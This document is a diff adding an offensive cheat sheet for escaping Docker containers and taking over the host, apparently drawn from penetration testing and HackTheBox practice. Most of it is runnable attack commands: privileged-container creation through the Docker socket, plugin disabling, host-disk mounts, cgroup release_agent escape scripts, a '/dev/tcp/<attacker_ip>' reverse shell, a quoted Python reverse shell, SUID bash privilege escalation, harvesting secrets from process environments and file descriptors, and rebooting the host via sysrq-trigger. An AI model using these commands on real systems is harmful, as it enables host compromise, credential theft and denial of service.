@@ -1,0 +1,400 @@
+
+if after getting a shell you find yourself in a docker then IP x.x.0.1 is the host OS where you want to go, so try to ssh there
+
+ssh <user>@x.x.0.1
+scan docker network from the docker but if it’s not possible because e.g ping command not available etc then remember to scan this network from the host OS 
+
+scan docker image
+docker images
+docker scan <image_name>
+
+check docker capabilities
+
+ cat /proc/self/status | grep Cap
+#if you have any capabilities they will be displayed in hex
+#then on my terminal
+
+capsh –decode=<hex_from_above>
+
+Decoded capabilities can be abused as mention in the Linux privilege escalation section
+
+or
+
+unshare -UrmCpf bash
+# Check them with
+cat /proc/self/status | grep CapEff
+
+check if docker content trust is enabled
+echo DOCKER_CONTENT_TRUST
+#1 means is enabled
+
+When content trust is enabled, we can pull only signed images
+
+check if the image contains any sensitive information 
+
+docker inspect 
+or
+docker exec
+
+the security measure for this is to use docker secret e.g BuildKit
+Set it as an environment variable with export DOCKER_BUILDKIT=1
+or
+Enable BuildKit by default. Set the configuration in /etc/docker/daemon.json to true with: { "features": { "buildkit": true } }. Then restart Docker.
+
+Once BuildKit is enabled
+
+docker build --secret my_key=my_value ,src=path/to/my_secret_file .
+
+thanks to this  secrets are excluded from the image build cache. and from the final image. secrets are excluded from the image build cache. and from the final image.
+
+If you need your secret in alerady running container, and not just when building your image modify docker-compose.yml file
+
+version: "3.7"
+
+services:
+
+  my_service:
+    image: centos:7
+    entrypoint: "cat /run/secrets/my_secret"
+    secrets:
+      - my_secret
+
+secrets:
+  my_secret:
+    file: ./my_secret_file.txt
+
+then start it with the following command
+
+docker-compose up --build my_service
+
+
+disable plugins
+docker images
+docker plugin list #Enumerate plugins
+
+# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
+docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
+# "authbolt" is the name of the previous plugin
+
+docker plugin disable authobot
+docker run --rm -it --privileged -v /:/host <image_name> bash
+
+abusing unchecked JSON structure
+
+binds in root
+
+docker version #First, find the API version of docker, 
+docker images #List the images available
+#Then, a container that mounts the root folder of the host
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "<image_name>", "Binds":["/:/host"]}' http:/<image_version>/containers/create
+docker start <SHA256_of_image> #Start the created privileged container
+docker exec -it <SHA256_of_image> chroot /host bash #Get a shell inside of it
+#You can access the host filesystem
+
+binds in HostConfig
+docker version #First, find the API version of docker, 
+docker images #List the images available
+#Then, a container that mounts the root folder of the host
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
+docker start <SHA256_of_image> #Start the created privileged container
+docker exec -it <SHA256_of_image> chroot /host bash #Get a shell inside of it
+
+mounts in root
+
+docker version #First, find the API version of docker, 
+docker images #List the images available
+#Then, a container that mounts the root folder of the host
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
+docker start <SHA256_of_image> #Start the created privileged container
+docker exec -it <SHA256_of_image> chroot /host bash #Get a shell inside of it
+
+mounts in HostConfig
+docker version #First, find the API version of docker, 
+docker images #List the images available
+#Then, a container that mounts the root folder of the host
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
+docker start <SHA256_of_image> #Start the created privileged container
+docker exec -it <SHA256_of_image> chroot /host bash #Get a shell inside of it
+
+abusing unchecked JSON attributes
+docker version
+docker images
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
+docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
+docker ps
+docker exec -it c52a77629a91 bash
+capsh --print
+#You can abuse the SYS_MODULE capability
+
+analyze docker files
+
+tar -xvf docker.tar
+#you will get hashes
+ls <hash> to see the content
+tar -xvf <hash>/<file.tar>
+
+k) check content of */seccomp/profile.json 
+this file specifies what commands are allowed within the docker 
+
+l) abusing  docker sockets
+
+#List images to use one
+docker images
+
+#Run the image mounting the host disk and chroot on it
+docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+
+# Get full access to the host via ns pid and nsenter cli
+docker run -it --rm --pid=host --privileged ubuntu bash
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+#or assign capabilities 
+docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
+
+#then abuse newly assigned capabilities as describe in the section
+
+m) abusing privileged flag
+
+docker run --rm -it --pid=host --privileged ubuntu bash
+
+or
+
+docker run --rm -it --privileged ubuntu bash
+
+n) mounting custom directory
+
+fdisk -l
+#if you got the result like /dev/sda1, then it means the docker is misconfigured and you can abused it to take over the host machine
+
+mkdir -p /mnt/simon
+mount /dev/sda1 /mnt/simon
+ You can now access the filesystem of the host because it is mounted in the /mnt/simon folder
+
+or
+
+### Check if You Can Write to a File-system
+echo 1 > /proc/sysrq-trigger
+
+### Check root UUID
+cat /proc/cmdline
+BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300
+
+# Check Underlying Host Filesystem
+findfs UUID=<UUID Value>
+/dev/sda1
+
+# Attempt to Mount the Host's Filesystem
+mkdir /mnt-test
+mount /dev/sda1 /mnt-test
+mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
+
+### debugfs (Interactive File System Debugger)
+debugfs /dev/sda1
+
+o)by abusing release agent
+
+
+# Finds + enables a cgroup release_agent
+# Looks for something like: /sys/fs/cgroup/*/release_agent
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+# If "d" is empty, this won't work, otherwise
+# Enables notify_on_release in the cgroup
+mkdir -p $d/w;
+echo 1 >$d/w/notify_on_release
+# If you have a "Read-only file system" error, it won’t work, otherwise
+
+# Finds path of OverlayFS mount for container
+
+t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+# Sets release_agent to /path/payload
+touch /o; echo $t/c > $d/release_agent
+
+# Creates a payload
+echo "#!/bin/sh" > /c
+echo "ps > $t/o" >> /c
+chmod +x /c
+
+# Triggers the cgroup via empty cgroup.procs
+sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
+
+# Reads the output
+cat /o
+
+
+or
+
+# On the host
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+
+# Mounts the RDMA cgroup controller and create a child cgroup
+
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+# If mount gives an error, this won't work,otherwise
+
+# Enables cgroup notifications on release of the "x" cgroup
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Finds path of OverlayFS mount for container
+
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+# Sets release_agent to /path/payload
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+#payload content
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/<attacker_ip>/9000 0>&1" >> /cmd
+chmod a+x /cmd
+
+
+# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
+# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
+# The script on the host will execute after /bin/sh exits 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# Reads the output
+cat /output
+
+or
+
+#!/bin/sh
+
+OUTPUT_DIR="/"
+MAX_PID=65535
+CGROUP_NAME="xyx"
+CGROUP_MOUNT="/tmp/cgrp"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+
+# Run a process for which we can search for (not needed in reality, but nice to have)
+sleep 10000 &
+
+# Prepare the payload script to execute on the host
+cat > ${PAYLOAD_PATH} << __EOF__
+#!/bin/sh
+
+OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
+
+# Commands to run on the host<
+ps -eaf > \${OUTPATH} 2>&1
+__EOF__
+
+# Make the payload script executable
+chmod a+x ${PAYLOAD_PATH}
+
+# Set up the cgroup mount using the memory resource cgroup controller
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+
+# Brute force the host pid until the output path is created, or we run out of guesses
+TPID=1
+while [ ! -f ${OUTPUT_PATH} ]
+do
+  if [ $((${TPID} % 100)) -eq 0 ]
+  then
+    echo "Checking pid ${TPID}"
+    if [ ${TPID} -gt ${MAX_PID} ]
+    then
+      echo "Exiting at ${MAX_PID} :-("
+      exit 1
+    fi
+  fi
+  # Set the release_agent path to the guessed pid
+  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+  # Trigger execution of the release_agent
+  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+  TPID=$((${TPID} + 1))
+done
+
+# Wait for and cat the output
+sleep 1
+echo "Done! Output:"
+cat ${OUTPUT_PATH}
+
+p) abusing communication between container and host
+
+
+If you have access as root inside a container that has some folder from the host mounted and you have escaped as a non privileged user to the host and have read access over the mounted folder. You can create a bash suid file in the mounted folder inside the container and execute it from the host to privesc
+
+cp /bin/bash . #From non priv inside mounted folder
+# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
+chown root:root bash #From container as root inside mounted folder
+chmod 4777 bash #From container as root inside mounted folder
+bash -p #From non priv inside mounted folder
+
+
+or
+# On the container as root
+cd /
+# Crate device
+mknod sda b 8 0
+# Give access to it
+chmod 777 sda
+
+# Create the nonepriv user of the host inside the container
+## In this case it's called augustus (like the user from the host /etc/passwd)
+echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
+# Get a shell as augustus inside the container
+su augustus
+su: Authentication failure
+(Ignored)
+augustus@3a453ab39d3d:/backend$ /bin/sh
+/bin/sh
+$ 
+
+# On the host
+
+# get the real PID of the shell inside the container as the new 
+augustus@GoodGames:~$ ps -auxf | grep /bin/sh
+root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
+augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh
+
+# The process ID is 1659 in this case
+# Grep for the sda for HTB{ through the process:
+augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
+HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
+
+
+r) steal env secrets
+
+for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
+/proc/988058/environ
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=argocd-server-69678b4f65-6mmql
+USER=abrgocd
+...
+
+s)access other processes file descriptors and read their open filesaccess other processes file descriptors and read their open files
+
+for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
+less fds.txt
+...omitted for brevity...
+lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
+lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
+# You can open the secret filw with:
+cat /proc/635813/fd/4
+
+You can also kill processes and cause a DoS
+
+t) abusing ssrq-trigger
+
+Sysrq is an old mechanism which can be invoked via a special SysRq keyboard combination. This can allow an immediate reboot of the system, issue of sync(2), remounting all filesystems as read-only, invoking kernel debuggers, and other operations.
+If the guest is not properly isolated, it can trigger the sysrq commands by writing characters to /proc/sysrq-trigger
+# Reboot the host
+echo b > /proc/sysrq-trigger
+
+
+u) read /proc/kcore
+
+The ability to read this file (you must be root on the container) can leak memory contents from the host system and other containers.
